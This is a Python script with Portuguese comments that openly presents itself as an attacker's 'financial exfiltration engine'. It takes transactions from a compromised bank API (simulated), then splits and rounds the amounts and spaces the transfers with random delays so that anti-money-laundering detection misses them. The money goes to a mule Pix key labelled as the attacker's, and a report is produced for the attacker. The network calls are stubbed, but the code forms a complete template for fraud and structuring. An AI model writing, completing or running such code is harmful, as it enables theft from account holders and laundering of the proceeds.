import json
import time
import random
import logging
from datetime import datetime
from typing import List, Dict, Any

# Configuração de Log para auditoria de tráfego
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class FinancialExfiltrationEngine:
    def __init__(self, destination_key: str, min_threshold: float = 0.05, max_batch_size: int = 50):
        """
        Inicializa o motor de exfiltração financeira.
        
        :param destination_key: Chave Pix de destino (mule account).
        :param min_threshold: Valor mínimo para processar uma transação.
        :param max_batch_size: Máximo de transações por lote para evitar bloqueios de rate-limit.
        """
        self.destination_key = destination_key
        self.min_threshold = min_threshold
        self.max_batch_size = max_batch_size
        self.transaction_log = []
        self.fraud_patterns = self._load_fraud_patterns()

    def _load_fraud_patterns(self) -> List[Dict]:
        # Define padrões de "lavar" dinheiro ou ofuscar a origem
        return [
            {"strategy": "rounding", "description": "Ajustar valores para números redondos"},
            {"strategy": "splitting", "description": "Dividir valores grandes em transações menores"},
            {"strategy": "temporal_smoothing", "description": "Espaçar transações no tempo para simular uso humano"}
        ]

    def fetch_compromised_transactions(self, api_endpoint: str, payload: Dict) -> List[Dict]:
        """
        Simula a extração de dados de uma API comprometida.
        Em um cenário real, isso seria um POST/GET para um endpoint exposto.
        """
        logger.info(f"Connecting to endpoint: {api_endpoint}")
        # Simulação de resposta da API
        # Em produção, usaria requests ou httpx aqui
        simulated_response = [
            {"id": 1001, "amount": 150.75, "currency": "BRL", "origin": "corporate_account_A"},
            {"id": 1002, "amount": 2500.00, "currency": "BRL", "origin": "personal_account_B"},
            {"id": 1003, "amount": 12.50, "currency": "BRL", "origin": "small_merchant_C"},
            {"id": 1004, "amount": 890.20, "currency": "BRL", "origin": "corporate_account_D"}
        ]
        logger.info(f"Extracted {len(simulated_response)} transactions.")
        return simulated_response

    def apply_fraud_obfuscation(self, transactions: List[Dict]) -> List[Dict]:
        """
        Aplica técnicas de ofuscação financeira para reduzir a chance de detecção por AML (Anti-Money Laundering).
        """
        obfuscated = []
        for tx in transactions:
            amount = tx['amount']
            if amount < self.min_threshold:
                continue # Ignora valores muito pequenos que geram ruído

            # Estratégia: Splitting (Divisão)
            # Se o valor for maior que R$ 1000, divide em 3 transações menores
            if amount > 1000:
                split_amount = amount / 3
                for i in range(3):
                    obfuscated.append({
                        "original_id": tx['id'],
                        "amount": round(split_amount, 2),
                        "currency": tx['currency'],
                        "destination": self.destination_key,
                        "timestamp": datetime.now().isoformat(),
                        "obfuscation": "splitting"
                    })
            else:
                # Estratégia: Rounding (Arredondamento)
                # Ajusta para 2 casas decimais exatas, removendo frações estranhas
                obfuscated.append({
                    "original_id": tx['id'],
                    "amount": round(amount, 2),
                    "currency": tx['currency'],
                    "destination": self.destination_key,
                    "timestamp": datetime.now().isoformat(),
                    "obfuscation": "rounding"
                })
        
        return obfuscated

    def execute_transfer_batch(self, transactions: List[Dict]) -> Dict[str, Any]:
        """
        Simula a execução do lote de transferências via API de Pagamento.
        Implementa 'temporal smoothing' (jitter) para parecer natural.
        """
        results = {"success": 0, "failed": 0, "total_moved": 0.0}
        
        logger.info(f"Starting transfer batch of {len(transactions)} items to {self.destination_key}")
        
        for i, tx in enumerate(transactions):
            # Jitter: Espera aleatória entre 500ms e 2s
            jitter = random.uniform(0.5, 2.0)
            time.sleep(jitter)
            
            # Simulação de Chamada à API do Banco/Pix
            # requests.post('https://bank-api.com/v1/transfer', json=tx)
            
            # Simulação de Sucesso (95% de chance)
            if random.random() > 0.05:
                results["success"] += 1
                results["total_moved"] += tx['amount']
                self.transaction_log.append(tx)
                logger.info(f"[OK] Transfer {i+1}: {tx['amount']} BRL -> {self.destination_key}")
            else:
                results["failed"] += 1
                logger.warning(f"[FAIL] Transfer {i+1}: {tx['amount']} BRL failed. Retrying or skipping.")

        return results

    def generate_audit_report(self) -> str:
        """Gera um relatório JSON para o atacante revisar o que foi movido."""
        return json.dumps({
            "report_timestamp": datetime.now().isoformat(),
            "destination_key": self.destination_key,
            "total_transactions": len(self.transaction_log),
            "total_value_moved": sum(tx['amount'] for tx in self.transaction_log),
            "transactions": self.transaction_log
        }, indent=4)

def main():
    # Configuração do Atacante
    ATTACKER_KEY = "0x1234567890abcdef1234567890abcdef" # Sua chave Pix
    
    # Inicializa o Motor
    engine = FinancialExfiltrationEngine(destination_key=ATTACKER_KEY)
    
    # 1. Extrai Dados (Simulado)
    # Em um cenário real, você passaria o endpoint do sistema alvo
    raw_transactions = engine.fetch_compromised_transactions("https://target-bank.com/api/v1/ledger", {})
    
    # 2. Ofusca os Dados
    clean_transactions = engine.apply_fraud_obfuscation(raw_transactions)
    
    # 3. Executa as Transferências
    summary = engine.execute_transfer_batch(clean_transactions)
    
    # 4. Gera Relatório
    report = engine.generate_audit_report()
    print("AUDIT REPORT:")
    print(report)

if __name__ == "__main__":
    main()